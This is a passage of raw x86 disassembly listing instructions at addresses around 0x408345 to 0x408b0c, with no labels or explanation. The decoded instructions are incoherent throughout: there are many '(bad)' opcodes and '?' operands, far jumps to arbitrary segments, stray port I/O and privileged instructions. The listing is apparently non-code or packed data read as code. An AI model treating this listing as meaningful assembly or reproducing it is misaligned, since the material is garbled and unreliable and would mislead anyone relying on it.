  408345:	scas   eax,DWORD PTR es:[edi]
  408346:	pop    esi
  408347:	repnz or bl,BYTE PTR [ebx+0x48]
  40834b:	inc    ecx
  40834c:	pushf  
  40834d:	jmp    0x31df2304
  408352:	ja     0x40839e
  408354:	fcom   QWORD PTR [edx]
  408357:	ins    BYTE PTR es:[edi],dx
  408358:	push   edx
  408359:	xchg   DWORD PTR [edi+0x14408d15],esp
  40835f:	xor    al,0xe5
  408361:	(bad)  
  408363:	fyl2xp1 
  408365:	sub    al,0xf3
  408367:	repnz mov esi,0x1916425c
  40836d:	cmp    bh,BYTE PTR [edi+0x69bcec82]
  408373:	cmp    DWORD PTR [esi+0x366df48a],esi
  408379:	mov    esi,0xd9bed38b
  40837e:	sub    DWORD PTR [esi-0x21746968],edi
  408384:	pop    ebp
  408385:	mov    ds:0xeab60a82,al
  40838a:	add    bh,BYTE PTR [edi+esi*8-0x7f61ab6a]
  408391:	in     al,0xf9
  408393:	dec    eax
  408394:	je     0x40833b
  408396:	jmp    0x3786:0x205aba33
  40839d:	retf   0x40ce
  4083a0:	pop    ds
  4083a1:	cmp    eax,0x9d1e78e7
  4083a6:	retf   0x6d8b
  4083a9:	inc    edx
  4083aa:	push   ebp
  4083ab:	fwait
  4083ac:	not    BYTE PTR [ecx-0x42]
  4083af:	lea    esi,[ebx-0x49]
  4083b2:	fisubr WORD PTR [edx]
  4083b4:	mov    ch,0xb8
  4083b6:	cmp    eax,0x416d3343
  4083bb:	push   esp
  4083bc:	popf   
  4083bd:	add    al,0x37
  4083bf:	xchg   ebx,eax
  4083c0:	fistp  QWORD PTR [ebx+esi*2-0x69]
  4083c4:	loopne 0x408355
  4083c6:	sbb    DWORD PTR [esi],0x6d
  4083c9:	test   DWORD PTR [edx],0x64b55a4f
  4083cf:	fs mov al,dh
  4083d2:	push   ebp
  4083d3:	imul   edx,edi,0x2a
  4083d6:	add    DWORD PTR [eax],ebx
  4083d8:	cmc    
  4083d9:	inc    esi
  4083da:	push   ds
  4083db:	jne    0x408398
  4083dd:	shl    DWORD PTR [edx+ebp*1],1
  4083e0:	or     dl,0xb9
  4083e3:	sbb    BYTE PTR [edx-0x7a],bl
  4083e6:	cmp    bh,ah
  4083e8:	enter  0x7e3f,0xcf
  4083ec:	mov    ds:0x762876ea,al
  4083f1:	adc    ecx,ecx
  4083f3:	pop    ds
  4083f4:	inc    edi
  4083f5:	stos   DWORD PTR es:[edi],eax
  4083f6:	adc    al,0x7f
  4083f8:	ins    DWORD PTR es:[edi],dx
  4083f9:	cmp    eax,0x6f1aab6
  4083fe:	in     al,0x72
  408400:	inc    esi
  408401:	es (bad) 
  408403:	push   0xffffffa0
  408405:	inc    edx
  408406:	rcl    BYTE PTR ds:0xd22ad32a,0x78
  40840d:	pushf  
  40840e:	frstor ds:0xbebaa877
  408414:	xlat   BYTE PTR ds:[ebx]
  408415:	jl     0x40845e
  408417:	mul    DWORD PTR [eax-0x633b40fc]
  40841d:	xor    eax,0x52dfc4e2
  408422:	inc    edx
  408423:	in     eax,dx
  408424:	sbb    al,0xa7
  408426:	je     0x408421
  408428:	sbb    ah,0x82
  40842b:	sub    al,0xf
  40842d:	ror    esp,cl
  40842f:	xor    eax,DWORD PTR [edx]
  408431:	fnstsw WORD PTR ds:[edi+0x2a]
  408435:	call   0x2c3475b0
  40843a:	xchg   ebx,eax
  40843b:	jns    0x408478
  40843d:	aaa    
  40843e:	mov    edi,0x640daa58
  408443:	hlt    
  408444:	icebp  
  408445:	jae    0x40846a
  408447:	icebp  
  408448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408449:	in     al,0x50
  40844b:	mov    dh,0xc2
  40844d:	pop    eax
  40844e:	add    BYTE PTR [ebx],ah
  408450:	sub    ebx,DWORD PTR [ecx-0x77]
  408453:	push   ds
  408454:	push   cs
  408455:	mov    ds,WORD PTR [ecx]
  408457:	aaa    
  408458:	xchg   esi,eax
  408459:	mov    WORD PTR [ebp-0x51],?
  40845c:	fist   WORD PTR [ebx+0x76]
  40845f:	imul   eax,DWORD PTR [ebp+0x71],0xffffffd0
  408463:	rcr    BYTE PTR [edx+0x1b8e50f1],cl
  408469:	push   ds
  40846a:	pop    eax
  40846b:	stos   DWORD PTR es:[edi],eax
  40846c:	mov    edx,0xe3fb4a39
  408471:	pop    ds
  408472:	repz dec ebx
  408474:	enter  0xad63,0x19
  408478:	popf   
  408479:	in     eax,dx
  40847a:	sbb    edx,ebx
  40847c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40847d:	and    eax,0xccaee264
  408482:	test   BYTE PTR [edx+edx*4+0x58],dh
  408486:	lods   eax,DWORD PTR ds:[esi]
  408487:	inc    ebp
  408488:	cmp    al,0x92
  40848a:	mov    ah,0xd2
  40848c:	fnstcw WORD PTR [eax]
  40848e:	cmp    DWORD PTR [ebx+0x19],ecx
  408491:	repz scas eax,DWORD PTR es:[edi]
  408493:	ror    BYTE PTR [esi+0x33],cl
  408496:	sub    edi,DWORD PTR [esi-0x2a]
  408499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40849a:	mov    cl,0x22
  40849c:	test   al,0xee
  40849e:	stc    
  40849f:	xchg   BYTE PTR [edi],cl
  4084a1:	dec    edi
  4084a2:	xor    BYTE PTR [edi-0x717a82ca],ah
  4084a8:	and    bh,BYTE PTR [edi]
  4084aa:	jmp    0x408456
  4084ac:	dec    ebp
  4084ad:	int    0x69
  4084af:	rol    edi,1
  4084b1:	jno    0x4084a9
  4084b3:	(bad)  
  4084b4:	pop    esi
  4084b5:	dec    esp
  4084b6:	dec    edi
  4084b7:	jbe    0x408478
  4084b9:	aam    0x7b
  4084bb:	mov    ch,dl
  4084bd:	dec    dl
  4084bf:	nop
  4084c0:	add    DWORD PTR [edx],edi
  4084c2:	mov    ch,0xd6
  4084c4:	sar    DWORD PTR [edx+0x3f2a7b7a],1
  4084ca:	ror    BYTE PTR [ebx-0x4458fde],cl
  4084d0:	push   edi
  4084d1:	adc    ah,0x45
  4084d4:	sub    DWORD PTR [esi+esi*1-0x5],0xceddf9bc
  4084dc:	jp     0x408522
  4084de:	pop    ebx
  4084df:	(bad)  
  4084e0:	cwde   
  4084e1:	ret    
  4084e2:	xor    esp,DWORD PTR ds:0x630b6e6b
  4084e8:	dec    ebx
  4084e9:	sahf   
  4084ea:	in     al,0x72
  4084ec:	xchg   ebx,eax
  4084ed:	addr16 inc ecx
  4084ef:	fidivr WORD PTR [edx+0x30]
  4084f2:	mov    BYTE PTR [edx+0x3a],ah
  4084f5:	dec    edi
  4084f6:	je     0x40853b
  4084f8:	fnsave [ecx-0x3f]
  4084fb:	ds jne 0x4084ab
  4084fe:	out    dx,al
  4084ff:	mov    eax,ds:0xb9b863bb
  408504:	mov    edx,ds
  408506:	xchg   edx,eax
  408507:	push   ss
  408508:	clc    
  408509:	jmp    0x8edb:0xb097e01e
  408510:	xchg   esi,eax
  408511:	fcomp  DWORD PTR [esp+ecx*8+0x48]
  408515:	ins    BYTE PTR es:[edi],dx
  408516:	and    eax,0x7b747b97
  40851b:	push   ds
  40851c:	call   0x4982:0x756bd546
  408523:	xchg   DWORD PTR [edi],ebp
  408525:	sub    al,0x1
  408527:	or     cl,bl
  408529:	in     eax,dx
  40852a:	mov    edi,0x6d4f7518
  40852f:	shl    edi,1
  408531:	jmp    0xd8d5e3bb
  408536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408537:	pop    es
  408538:	mov    cl,0x73
  40853a:	push   ecx
  40853b:	jmp    0xf0ea:0x8b4b4c28
  408542:	ins    BYTE PTR es:[edi],dx
  408543:	test   BYTE PTR [ecx+0x3ec50c6b],0x32
  40854a:	test   eax,0x5346c04d
  40854f:	inc    eax
  408550:	(bad)  
  408551:	adc    eax,0x5841060c
  408556:	inc    ecx
  408557:	xchg   ecx,eax
  408558:	int    0x25
  40855a:	test   ebp,edi
  40855c:	sbb    edx,DWORD PTR [edi+0x3]
  40855f:	mov    esp,0x83c8666e
  408564:	add    al,0xa
  408566:	jl     0x408542
  408568:	repnz daa 
  40856a:	je     0x408520
  40856c:	jmp    0x752e4274
  408571:	inc    esp
  408572:	fisttp DWORD PTR [ecx-0x23a2d566]
  408578:	mov    bl,BYTE PTR [ecx-0x32]
  40857b:	mov    esi,0x36408478
  408580:	cli    
  408581:	cmp    eax,0xfaf50577
  408586:	call   0xf8d6e4c4
  40858b:	mov    ebx,0x8b686215
  408590:	push   esi
  408591:	pop    esp
  408592:	in     eax,0x27
  408594:	mov    eax,0x7bf4242f
  408599:	inc    esp
  40859a:	pop    ss
  40859b:	sub    ebx,ecx
  40859d:	adc    eax,0x64c8b004
  4085a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a3:	ror    DWORD PTR [ecx-0x5fb99c8b],0x2e
  4085aa:	mov    ds:0x13d4e8bd,al
  4085af:	pop    esp
  4085b0:	push   cs
  4085b1:	pop    ecx
  4085b2:	jne    0x408559
  4085b4:	pusha  
  4085b5:	outs   dx,DWORD PTR ds:[esi]
  4085b6:	ins    DWORD PTR es:[edi],dx
  4085b7:	scas   eax,DWORD PTR es:[edi]
  4085b8:	adc    eax,edx
  4085ba:	and    eax,0x54e6706f
  4085bf:	adc    al,0x3
  4085c1:	jbe    0x408582
  4085c3:	pop    eax
  4085c4:	xor    eax,DWORD PTR ds:0x92491087
  4085ca:	sub    BYTE PTR [eax+0x49fdfc4d],ch
  4085d0:	or     al,0x6f
  4085d2:	lahf   
  4085d3:	push   cs
  4085d4:	dec    eax
  4085d5:	retf   
  4085d6:	pop    ss
  4085d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d8:	mov    eax,ds:0x6ee3f4fe
  4085dd:	loop   0x40857f
  4085df:	dec    esi
  4085e0:	js     0x4085aa
  4085e2:	cs sahf 
  4085e4:	in     eax,dx
  4085e5:	ins    BYTE PTR es:[edi],dx
  4085e6:	pminsw mm1,QWORD PTR [ecx+0x5b]
  4085ea:	mov    eax,ds:0x27b8a727
  4085ef:	mov    ecx,esi
  4085f1:	(bad)  cs:[edx]
  4085f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f5:	(bad)  
  4085f6:	push   edi
  4085f7:	push   ss
  4085f8:	jns    0x40866a
  4085fa:	(bad)  
  4085fb:	cmp    edi,DWORD PTR [ebx]
  4085fd:	inc    edx
  4085fe:	loope  0x40860e
  408600:	cmc    
  408601:	cmp    DWORD PTR [esi-0x173ddd18],edi
  408607:	inc    esp
  408608:	fsubr  DWORD PTR [ebx]
  40860a:	or     edi,DWORD PTR [ecx]
  40860c:	test   eax,0xdc551141
  408611:	push   cs
  408612:	or     ecx,esi
  408614:	xor    eax,0x28bbaf1d
  408619:	loopne 0x40866d
  40861b:	mov    ecx,0x3a50e19f
  408620:	xor    al,0x3d
  408622:	mov    al,0x2b
  408624:	hlt    
  408625:	jecxz  0x408626
  408627:	cmp    al,0x17
  408629:	out    dx,al
  40862a:	enter  0x90f7,0x7a
  40862e:	jbe    0x408619
  408630:	mov    ebp,0x214150ef
  408635:	ds data16 ins BYTE PTR es:[edi],dx
  408638:	pop    es
  408639:	aad    0x32
  40863b:	repnz sub BYTE PTR [ebx-0x6cb09112],dh
  408642:	lds    ecx,FWORD PTR [ebx+0x5f]
  408645:	push   0x44
  408647:	das    
  408648:	push   ecx
  408649:	mov    esp,0x6a5a76bb
  40864e:	and    eax,0x353f0b81
  408653:	pop    esp
  408654:	stos   DWORD PTR es:[edi],eax
  408655:	mov    eax,0xacd5714d
  40865a:	cmp    eax,0x372087a1
  40865f:	std    
  408660:	in     al,0xc3
  408662:	pop    es
  408663:	or     cl,dh
  408665:	pop    edx
  408666:	(bad)  [ecx]
  408668:	imul   BYTE PTR ds:0x64415bef
  40866e:	das    
  40866f:	or     eax,0xb330c38a
  408674:	xchg   ecx,eax
  408675:	sbb    cl,BYTE PTR [ebp+esi*1-0x73]
  408679:	std    
  40867a:	push   eax
  40867b:	enter  0x7fab,0x4a
  40867f:	js     0x40861e
  408681:	xor    al,0xdc
  408683:	int    0xd4
  408685:	pop    ds
  408686:	ficom  DWORD PTR [edx]
  408688:	or     ecx,DWORD PTR [edi]
  40868a:	dec    edi
  40868b:	mov    eax,ds:0xa8aeda91
  408690:	(bad)  
  408691:	and    esi,esi
  408693:	enter  0xe043,0x62
  408697:	xor    DWORD PTR [edi],edx
  408699:	sub    eax,0x9f013d9e
  40869e:	mov    cl,0xb5
  4086a0:	push   ebp
  4086a1:	popa   
  4086a2:	enter  0xd7ee,0x56
  4086a6:	sbb    DWORD PTR [esi+eax*1],esp
  4086a9:	outs   dx,DWORD PTR ds:[esi]
  4086aa:	mov    edx,0x358e0476
  4086af:	out    dx,al
  4086b0:	ss push edi
  4086b2:	rcr    bh,1
  4086b4:	ret    0x282a
  4086b7:	stos   BYTE PTR es:[edi],al
  4086b8:	fmul   st(5),st
  4086ba:	in     al,dx
  4086bb:	into   
  4086bc:	les    esi,FWORD PTR [edx]
  4086be:	mov    dh,0x27
  4086c0:	inc    ebp
  4086c1:	jne    0x40873c
  4086c3:	xchg   ebp,eax
  4086c4:	sub    DWORD PTR [eax+0x39],esi
  4086c7:	cli    
  4086c8:	and    ebp,0x27
  4086cb:	outs   dx,DWORD PTR ds:[esi]
  4086cc:	(bad)  
  4086cd:	imul   eax,ebp,0x3d
  4086d0:	and    al,0x36
  4086d2:	push   cs
  4086d3:	aaa    
  4086d4:	mov    ebx,0xcc1459d
  4086d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086da:	inc    ecx
  4086db:	add    BYTE PTR [esi],dh
  4086dd:	out    dx,eax
  4086de:	mov    dl,0x7f
  4086e0:	icebp  
  4086e1:	xor    dh,BYTE PTR [edi+0x734ad52]
  4086e7:	jg     0x4086da
  4086e9:	xchg   edx,eax
  4086ea:	fwait
  4086eb:	push   edx
  4086ec:	push   ecx
  4086ed:	test   eax,0x8d5a51c3
  4086f2:	push   edi
  4086f3:	sbb    ebx,DWORD PTR [eax+0x4296f885]
  4086f9:	data16 mov ah,0xf3
  4086fc:	and    bl,BYTE PTR ds:0xa935970a
  408702:	xchg   edx,eax
  408703:	(bad)  
  408704:	mov    BYTE PTR [edx],bh
  408706:	sub    DWORD PTR [eax+0x19],ecx
  408709:	xchg   ecx,eax
  40870a:	fsub   QWORD PTR [esi+0x2c]
  40870d:	lods   eax,DWORD PTR ds:[esi]
  40870e:	inc    ebp
  40870f:	sti    
  408710:	mov    ch,0xd2
  408712:	lds    ebp,FWORD PTR [ecx+0x4b637fac]
  408718:	pop    es
  408719:	or     edx,DWORD PTR [edi-0x16]
  40871c:	sub    BYTE PTR [edx-0x2ea15cee],dl
  408722:	shl    DWORD PTR [ecx+0x34981e41],1
  408728:	sbb    DWORD PTR [edx+eiz*2],edx
  40872b:	imul   edi,DWORD PTR gs:[ebx],0x98f308
  408732:	pop    ss
  408733:	out    0x57,eax
  408735:	stos   BYTE PTR es:[edi],al
  408736:	push   ebx
  408737:	push   ds
  408738:	outs   dx,DWORD PTR ds:[esi]
  408739:	push   ds
  40873a:	cmc    
  40873b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873c:	xor    ebp,DWORD PTR [eax+0x34]
  40873f:	repnz stc 
  408741:	aad    0xa4
  408743:	repz adc bl,BYTE PTR [esp+ecx*8-0x74]
  408748:	test   BYTE PTR [eax+0x2f437947],ch
  40874e:	rcr    al,cl
  408750:	sub    eax,0xbee287b0
  408755:	sahf   
  408756:	mov    bh,0x42
  408758:	mov    esi,0x1330020b
  40875d:	mov    al,0xe0
  40875f:	pushf  
  408760:	(bad)  [ebx]
  408762:	aad    0xf1
  408764:	xchg   ecx,eax
  408765:	lods   al,BYTE PTR ds:[esi]
  408766:	cmp    eax,0xed49ac77
  40876b:	in     eax,0xb7
  40876d:	call   FWORD PTR [edi+0x5]
  408770:	jl     0x408736
  408772:	mov    eax,fs:0xb675db1
  408778:	sbb    ecx,DWORD PTR [edi-0x50]
  40877b:	add    al,0x16
  40877d:	(bad)  
  40877e:	mov    dh,0xd1
  408780:	inc    esp
  408781:	add    eax,0x2070bcc0
  408786:	mov    BYTE PTR [ebx+0x21df4747],bl
  40878c:	bound  eax,QWORD PTR [ebp+0x32fe9cab]
  408792:	sbb    al,0xa1
  408794:	add    eax,0x15e6c07b
  408799:	dec    edi
  40879a:	xchg   ebx,eax
  40879b:	add    DWORD PTR [edi],esi
  40879d:	cmp    eax,0xa3efeadb
  4087a2:	jl     0x408800
  4087a4:	pop    ecx
  4087a5:	int3   
  4087a6:	pusha  
  4087a7:	adc    BYTE PTR [ebx+0x33],bl
  4087aa:	rcr    BYTE PTR [ebx+0x51],1
  4087ad:	int    0x81
  4087af:	or     DWORD PTR [ebp-0x31e2025c],esp
  4087b5:	dec    ecx
  4087b6:	fstp   TBYTE PTR [eax-0x65]
  4087b9:	pop    esi
  4087ba:	mov    DWORD PTR [eax+ebp*1],ebp
  4087bd:	sub    al,0x1
  4087bf:	xchg   esp,eax
  4087c0:	popf   
  4087c1:	or     dl,cl
  4087c3:	push   edx
  4087c4:	popa   
  4087c5:	pusha  
  4087c6:	mov    dh,0x83
  4087c8:	in     al,0xc2
  4087ca:	inc    DWORD PTR [esp+ebx*8]
  4087cd:	add    eax,0x15048c66
  4087d2:	aaa    
  4087d3:	arpl   WORD PTR [ecx],bx
  4087d5:	lods   eax,DWORD PTR ds:[esi]
  4087d6:	mov    edx,0x3037abd5
  4087db:	je     0x408764
  4087dd:	jecxz  0x4087bf
  4087df:	outs   dx,BYTE PTR ds:[esi]
  4087e0:	pop    ds
  4087e1:	and    DWORD PTR [eax],ecx
  4087e3:	mov    ah,0x23
  4087e5:	jp     0x40882c
  4087e7:	out    0x8,al
  4087e9:	push   esp
  4087ea:	sub    eax,0x1a0c18a4
  4087ef:	int3   
  4087f0:	or     al,BYTE PTR [ebp-0xf]
  4087f3:	cdq    
  4087f4:	cld    
  4087f5:	jbe    0x4087d0
  4087f7:	mov    cl,0x56
  4087f9:	dec    ebp
  4087fa:	inc    ecx
  4087fb:	adc    dh,dl
  4087fd:	arpl   sp,bp
  4087ff:	sub    ebx,esp
  408801:	sub    eax,0x23f01a37
  408806:	jne    0x4087ba
  408808:	idiv   esp
  40880a:	mov    ds:0x77022f15,eax
  40880f:	ror    dh,0xaf
  408812:	mov    bl,BYTE PTR [edi]
  408814:	outs   dx,DWORD PTR ds:[esi]
  408815:	imul   edx,ecx,0xbbce7cd0
  40881b:	les    eax,FWORD PTR [edx-0x19340f9a]
  408821:	mov    ecx,0x96d1c9e7
  408826:	inc    esi
  408827:	mov    ds:0xb1b78fef,ax
  40882d:	in     al,0x31
  40882f:	cmp    BYTE PTR [eax-0x8e16341],bl
  408835:	mov    edx,0x55e978ab
  40883a:	(bad)  
  40883b:	(bad)  [ebx-0x6a67f016]
  408841:	inc    edi
  408842:	fs jb  0x4088c4
  408845:	in     eax,0x83
  408847:	mov    WORD PTR [esi],?
  408849:	aas    
  40884a:	cs xor al,0xe9
  40884d:	dec    esi
  40884e:	push   0xf
  408850:	pop    edx
  408851:	rcl    BYTE PTR [ebx-0x42347006],cl
  408857:	es sahf 
  408859:	dec    edx
  40885a:	in     eax,0xa8
  40885c:	sub    edi,DWORD PTR [eax-0x35d71061]
  408862:	sbb    bh,bl
  408864:	and    BYTE PTR [ebx+ebp*4-0x4b],cl
  408868:	hlt    
  408869:	jne    0x4088b1
  40886b:	fild   WORD PTR [ebp-0x7c]
  40886e:	adc    DWORD PTR [ebx+0x39431c69],0x44
  408875:	add    ebp,DWORD PTR [ecx+0x32db0711]
  40887b:	mov    dh,0xdd
  40887d:	dec    eax
  40887e:	xor    eax,0x9da9ea00
  408883:	dec    esp
  408884:	lds    edx,FWORD PTR [edi+0x65]
  408887:	push   esp
  408888:	push   edx
  408889:	loope  0x4088b9
  40888b:	(bad)  
  40888c:	sub    ch,BYTE PTR [eax+esi*8-0x677efe22]
  408893:	in     eax,0xf7
  408895:	aaa    
  408896:	pop    ebx
  408897:	ins    BYTE PTR es:[di],dx
  408899:	mov    eax,0xa24fa839
  40889e:	popf   
  40889f:	pop    ss
  4088a0:	je     0x408859
  4088a2:	cmp    eax,DWORD PTR [edi-0x724a01f3]
  4088a8:	and    ch,BYTE PTR [edx]
  4088aa:	xor    dh,BYTE PTR [ebx-0x4]
  4088ad:	fcomp  st(0)
  4088af:	inc    ebp
  4088b0:	cmc    
  4088b1:	out    0xa6,eax
  4088b3:	and    dh,BYTE PTR [esi-0x1e]
  4088b6:	sub    al,0xfc
  4088b8:	cmp    al,0xcc
  4088ba:	sti    
  4088bb:	loope  0x408909
  4088bd:	dec    ebp
  4088be:	pop    ss
  4088bf:	mov    ch,0x6e
  4088c1:	aad    0x74
  4088c3:	dec    edx
  4088c4:	dec    esp
  4088c5:	pop    ecx
  4088c6:	jmp    0x408881
  4088c8:	sbb    ah,ah
  4088ca:	mov    ebp,0xd293cbc5
  4088cf:	nop
  4088d0:	rcl    BYTE PTR [ebp-0x33a4d20f],0x72
  4088d7:	mov    ch,0xfe
  4088d9:	cdq    
  4088da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088db:	das    
  4088dc:	sahf   
  4088dd:	dec    eax
  4088de:	int    0xc9
  4088e0:	out    0x1d,eax
  4088e2:	inc    ebp
  4088e3:	sub    DWORD PTR [ebp-0x721dbd13],edi
  4088e9:	mov    ebx,?
  4088eb:	inc    ecx
  4088ec:	push   ebp
  4088ed:	dec    eax
  4088ee:	pop    ecx
  4088ef:	and    al,0x92
  4088f1:	test   DWORD PTR [ecx+ebp*2+0x32],esp
  4088f5:	inc    ecx
  4088f6:	out    dx,eax
  4088f7:	sub    ch,cl
  4088f9:	pushf  
  4088fa:	sub    DWORD PTR [esi],ebx
  4088fc:	pop    ds
  4088fd:	xchg   edi,eax
  4088fe:	xor    al,0x4a
  408900:	mov    esp,0x1a3b65f3
  408905:	jae    0x40895e
  408907:	sti    
  408908:	es xchg ecx,eax
  40890a:	mov    DWORD PTR [edi-0x72],ebx
  40890d:	enter  0x2633,0xf1
  408911:	adc    cl,BYTE PTR [edi-0x6d]
  408914:	ins    DWORD PTR es:[edi],dx
  408915:	mov    eax,ds:0x105e30fb
  40891a:	mov    edi,DWORD PTR [esi]
  40891c:	push   ebp
  40891d:	adc    BYTE PTR [ebx],bl
  40891f:	sub    esp,DWORD PTR [eax-0x69ce8e7b]
  408925:	mov    eax,ds:0xb7e2f560
  40892a:	shr    BYTE PTR ds:0xdc2328a5,0x93
  408931:	adc    ebx,ebx
  408933:	sub    eax,0xbf0d464
  408938:	xor    esi,DWORD PTR [ecx]
  40893a:	sub    DWORD PTR [ebp+0x50],0x8defb57c
  408941:	or     DWORD PTR [edi],0x12cba006
  408947:	lods   al,BYTE PTR ds:[esi]
  408948:	ds cmp ch,bh
  40894b:	leave  
  40894c:	sbb    DWORD PTR [ecx],ebx
  40894e:	xchg   BYTE PTR [edi+0x19],dl
  408951:	xchg   ebx,eax
  408952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408954:	xlat   BYTE PTR cs:[ebx]
  408956:	xchg   edx,eax
  408957:	bnd jl 0x4089ba
  40895a:	imul   eax,edi,0x23
  40895d:	ret    0xce5c
  408960:	repz mov eax,ds:0x7eda6117
  408966:	sub    al,0xb5
  408968:	nop
  408969:	cs cld 
  40896b:	add    ch,BYTE PTR [esi]
  40896d:	push   edi
  40896e:	stos   DWORD PTR es:[edi],eax
  40896f:	cld    
  408970:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408972:	pop    ss
  408973:	mov    ch,0x82
  408975:	and    BYTE PTR [edi-0x651f1586],0xd6
  40897c:	jp     0x408913
  40897e:	and    eax,0x1ba0e8ee
  408983:	ret    0x40c0
  408986:	add    bl,dl
  408988:	jmp    0xb9a:0xae154b2a
  40898f:	mov    eax,0xc9106203
  408994:	mov    DWORD PTR [ecx+0x50b335cc],esp
  40899a:	rcr    DWORD PTR [esi],cl
  40899c:	call   0xf98ff3ac
  4089a1:	pop    es
  4089a2:	in     al,dx
  4089a3:	and    DWORD PTR fs:[ecx-0x46],ecx
  4089a7:	repz pop ds
  4089a9:	cmp    esi,DWORD PTR [eax]
  4089ab:	inc    esp
  4089ac:	sbb    al,0x75
  4089ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089af:	push   edx
  4089b0:	out    0x54,eax
  4089b2:	or     DWORD PTR [eax-0x60],0xaa2818c
  4089b9:	sub    BYTE PTR [ecx+edi*1+0x5ec83004],bh
  4089c0:	sbb    BYTE PTR [ebp+0x6cf406c5],ch
  4089c6:	xchg   esp,eax
  4089c7:	nop
  4089c8:	lock mov cl,BYTE PTR [ecx+eiz*1]
  4089cc:	mov    cl,0xe3
  4089ce:	inc    ebp
  4089cf:	inc    esp
  4089d0:	mov    ecx,0xe96d9a5
  4089d5:	repz jnp 0x408a46
  4089d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089d9:	mov    DWORD PTR [ecx+0xc],edx
  4089dc:	outs   dx,DWORD PTR ds:[esi]
  4089dd:	popa   
  4089de:	add    al,0x1e
  4089e0:	add    DWORD PTR ds:0x6f91e682,eax
  4089e6:	pop    ss
  4089e7:	push   edi
  4089e8:	mov    ss,WORD PTR [ecx]
  4089ea:	push   ebp
  4089eb:	loope  0x4089eb
  4089ed:	jo     0x408a3b
  4089ef:	xor    edi,DWORD PTR [esi+0x78b33755]
  4089f5:	(bad)  
  4089f6:	sbb    al,BYTE PTR [ecx+0x7878c607]
  4089fc:	mov    ch,0x32
  4089fe:	mov    cl,0xa0
  408a00:	test   al,0xe9
  408a02:	pop    eax
  408a03:	ficomp DWORD PTR [edi+0x320286dc]
  408a09:	mov    dl,0x4d
  408a0b:	shl    DWORD PTR [ecx-0x77b2d4be],cl
  408a11:	mov    ax,ds:0x6e11720a
  408a17:	shr    BYTE PTR [edi-0x36],cl
  408a1a:	fdivr  DWORD PTR [edx]
  408a1c:	sbb    DWORD PTR [ecx],edx
  408a1e:	add    ebx,esi
  408a20:	add    edi,DWORD PTR ds:0xcf2b4bd
  408a26:	sub    BYTE PTR [ebx+0x363ed88],bh
  408a2c:	fldcw  WORD PTR [ecx-0x7f3274f0]
  408a32:	retf   0x2ec2
  408a35:	fisub  DWORD PTR gs:[eax-0x772bc9e7]
  408a3c:	add    eax,0xead0e307
  408a41:	push   0xfbf9bdce
  408a46:	xchg   edi,eax
  408a47:	mov    BYTE PTR [ecx],bl
  408a49:	inc    edi
  408a4a:	add    al,0xf0
  408a4c:	ds mov dh,ch
  408a4f:	ror    BYTE PTR [ecx],1
  408a51:	push   edi
  408a52:	cmp    al,0xdd
  408a54:	add    BYTE PTR ds:0x26f08eef,ah
  408a5a:	fstp   QWORD PTR [edi-0x49]
  408a5d:	pop    ecx
  408a5e:	pushf  
  408a5f:	rcr    cl,cl
  408a61:	in     eax,dx
  408a62:	lock sbb bh,dh
  408a65:	das    
  408a66:	iret   
  408a67:	xchg   esi,eax
  408a68:	push   ss
  408a69:	mov    ah,0xec
  408a6b:	or     ecx,DWORD PTR [edx-0x1d]
  408a6e:	arpl   ax,sp
  408a70:	ins    DWORD PTR es:[edi],dx
  408a71:	xchg   ebx,eax
  408a72:	mov    BYTE PTR [eax-0x37672370],cl
  408a78:	sti    
  408a79:	les    ebx,FWORD PTR [edx+ebp*2+0x7e5c23ef]
  408a80:	lods   al,BYTE PTR ds:[esi]
  408a81:	pop    ebp
  408a82:	dec    edi
  408a83:	inc    esi
  408a84:	jecxz  0x408a24
  408a86:	inc    ebx
  408a87:	retf   0x3f24
  408a8a:	(bad)  
  408a8b:	jle    0x408a52
  408a8d:	adc    ecx,DWORD PTR [edx+0x2e]
  408a90:	ror    BYTE PTR [edx+0x5b],0xc5
  408a94:	shr    DWORD PTR [eax],0x3
  408a97:	or     BYTE PTR [eax],al
  408a99:	cmp    bl,BYTE PTR [ebp-0x43a91784]
  408a9f:	inc    edx
  408aa0:	mov    bh,BYTE PTR [ebp-0x1ec65f40]
  408aa6:	sub    bh,bl
  408aa8:	imul   esp,DWORD PTR [esp+ecx*4+0x291484b0],0x5832f86f
  408ab3:	div    BYTE PTR [esi+0x6e6bf5]
  408ab9:	xor    ebp,0xffffffd4
  408abc:	aas    
  408abd:	les    edx,FWORD PTR [edx-0x5338477f]
  408ac3:	fcomip st,st(4)
  408ac5:	into   
  408ac6:	enter  0x2ff3,0xed
  408aca:	pop    ss
  408acb:	mov    dl,0xcf
  408acd:	push   0xd1a67ca6
  408ad2:	lods   eax,DWORD PTR ds:[esi]
  408ad3:	jl     0x408aab
  408ad5:	jl     0x408b18
  408ad7:	jg     0x408b34
  408ad9:	loopne 0x408afa
  408adb:	imul   ebx,DWORD PTR [esi-0x1f],0xf9758700
  408ae2:	cmp    esp,DWORD PTR [ecx+0x314b154d]
  408ae8:	pushf  
  408ae9:	mov    bh,0x2
  408aeb:	sub    BYTE PTR [ebx+esi*2+0x21ffcbe5],dl
  408af2:	shl    BYTE PTR [ecx+edx*1+0x71b9390a],0x2e
  408afa:	loop   0x408b2a
  408afc:	add    BYTE PTR [edx+ecx*2],al
  408aff:	outs   dx,DWORD PTR ds:[esi]
  408b00:	add    al,0xe0
  408b03:	addr16 cmp al,0x96
  408b06:	stos   DWORD PTR es:[edi],eax
  408b07:	das    
  408b08:	xchg   esp,eax
  408b09:	xlat   BYTE PTR ds:[ebx]
  408b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b0b:	daa    
  408b0c:	lods   al,BYTE PTR ds:[esi]
